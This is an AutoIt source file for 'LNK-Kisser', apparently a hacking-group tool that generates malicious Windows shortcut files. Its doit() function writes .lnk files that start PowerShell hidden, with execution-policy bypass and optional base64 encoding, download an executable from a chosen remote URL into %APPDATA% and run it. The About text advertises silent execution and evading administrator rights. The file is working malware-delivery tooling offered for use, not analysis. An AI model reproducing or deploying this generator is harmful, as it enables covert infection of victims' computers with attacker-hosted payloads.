#cs

Author  : 9aylas
From   : Algeria
Home  : N/A

Greet's To  :  Ghosty , Erreur404 , Ramel , Deba , Zahir , Ouss , Redwan , Bellal , TheBen , H-F ...
               & All DzCyberSec Members.

		 PS/0x1 : Where? ( emplacement ) is not working , ( it installs automatically in %appdata% ) another time i will add this featur
		 or u can do it ,don't be a tree --' .

		 PS/0x2 : you can change the icon ( just go here : http://help4windows.com/windows_7_shell32_dll.shtml )
		 and put ur icon number here : FileCreateShortcut .... i choosed ( 154 )

#ce

#include <ButtonConstants.au3>
#include <ComboConstants.au3>
#include <StringConstants.au3>
#include <EditConstants.au3>
#include <GUIConstantsEx.au3>
#include <StaticConstants.au3>
#include <WindowsConstants.au3>
#Include "base64.au3"
#Region # GUI # Form=C:\Users\ByLka\Desktop\Form1.kxf
$MWAH = GUICreate("LNK-Kisser", 376, 152, 192, 114)
$url = GUICtrlCreateInput("https://www.lucifer.gov/payloads/malware.exe", 80, 40, 281, 21, BitOR($GUI_SS_DEFAULT_INPUT,$ES_CENTER))
GUICtrlSetColor(-1, 0xFF0000)
$cum = GUICtrlCreateButton("Make it cum", 80, 120, 281, 21)
GUICtrlSetFont(-1, 8, 800, 0, "MS Sans Serif")
$L0 = GUICtrlCreateLabel("Payload URL:", 8, 44, 70, 17)
GUICtrlSetColor(-1, 0x000080)

$location = GUICtrlCreateCombo("WHERE ?", 216, 64, 145, 25, BitOR($CBS_DROPDOWN,$CBS_AUTOHSCROLL,$CBS_OEMCONVERT))

GUICtrlSetData(-1, "APPDATA|TEMP|WINDOWS")
GUICtrlSetFont(-1, 8, 400, 0, "Courier")
GUICtrlSetColor(-1, 0xFF0000)
$L4 = GUICtrlCreateLabel("Shortcut Payload Generator ", 80, 8, 285, 27)
GUICtrlSetFont(-1, 14, 800, 0, "Century")
GUICtrlSetColor(-1, 0x808080)

$encoded = GUICtrlCreateRadio("Encoded Command", 232, 96, 121, 17)
GUICtrlSetState(-1, $GUI_CHECKED)
$notcoded = GUICtrlCreateRadio("Not Encoded", 80, 96, 81, 17)

$hihihihihi = GUICtrlCreateIcon("C:\Windows\System32\shell32.dll", -123, 24, 8, 32, 32)
$exename = GUICtrlCreateInput("anything.exe", 80, 64, 113, 21, BitOR($GUI_SS_DEFAULT_INPUT,$ES_CENTER))
GUICtrlSetColor(-1, 0xFF0000)
$L3 = GUICtrlCreateLabel("Exe  Name :", 8, 68, 62, 17)
GUICtrlSetColor(-1, 0x000080)
$L2 = GUICtrlCreateLabel("Payload Enc:", 8, 96, 67, 17)
GUICtrlSetColor(-1, 0x000080)
$aboutme = GUICtrlCreateButton("About ?", 8, 120, 65, 21)
$L1 = GUICtrlCreateLabel("(Base64)", 176, 96, 46, 17)
GUICtrlSetState(-1, $GUI_DISABLE)
GUISetState(@SW_SHOW)

While 1
	$nMsg = GUIGetMsg()
	Switch $nMsg
		Case $GUI_EVENT_CLOSE
			Exit

		 case $cum
			doit()
		 case $aboutme
			MsgBox(0,"About ?"," * LNK-Kisser is a Powershell Payload Generator *" & @CRLF & @CRLF & "Make your exe file hidden into shitty Shourtcut.lnk" &@crlf& "Automatically ready for a silent execution." &@crlf& "Plus Bypassing (Administrator Rights)." &@crlf& "Hidden while the process." &@crlf& ""&@crlf& "#E0F")

	EndSwitch
WEnd



func doit()

   if GUICtrlRead($encoded) = $GUI_CHECKED Then

	 $payx = "payload_encoded"
	 $x0x3d= "(New-Object System.Net.WebClient).DownloadFile('" &GUICtrlRead($url)& "','" &GUICtrlRead($exename)&" '); Start-Process '" &GUICtrlRead($exename)& "'"
     ;$x0x3d="(New-Object System.Net.WebClient).DownloadFile('" &GUICtrlRead($url)& "','%APPDATA%\" &GUICtrlRead($exename)& "'); cmd /c '%APPDATA%\" &GUICtrlRead($exename)& "'"
	 $b0xit = _Base64Encode(  StringToBinary ($x0x3d,$SB_UTF16LE))

FileCreateShortcut("C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",""&$payx& ".lnk","","-NoP -NonI -Exec Bypass -W Hidden -ExecutionPolicy bypass -noprofile -EncodedCommand " & $b0xit ,"","c:\windows\system32\shell32.dll","","154")
 IF @ERROR then
	 msgbox(16,"Error",@error)
  Else
	 MsgBox(0,"Settings"," Host : " &GUICtrlRead($url) & @crlf& " Malware Name : " &GUICtrlRead($exename) & @CRLF& " Payload here : " &@ScriptDir&"\" &$payx& ".lnk")
   MsgBox(0,'','Success, Your LNK Payload is ready ')
  EndIf

    Else
	  If GUICtrlRead($notcoded) = $GUI_CHECKED Then
 $pay = "payload"
     FileCreateShortcut("C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", ""&$pay& ".lnk","","-ExecutionPolicy bypass -noprofile -windowstyle hidden (New-Object System.Net.WebClient).DownloadFile('" &GUICtrlRead($url)& "','%APPDATA%\" &GUICtrlRead($exename)& "'); cmd /c '%APPDATA%\" &GUICtrlRead($exename)& "'","","c:\windows\system32\shell32.dll","","154")
    if @error Then
	   msgbox(16,"Error",@error)
	Else
	 MsgBox(0,"Settings"," Host : " &GUICtrlRead($url) & @crlf& " Malware Name : " &GUICtrlRead($exename) & @CRLF& " Payload here : " &@ScriptDir&"\" &$pay& ".lnk")
     MsgBox(0,'','Success , Your LNK Payload is ready ')
     EndIf

   EndIf
   EndIf

   EndFunc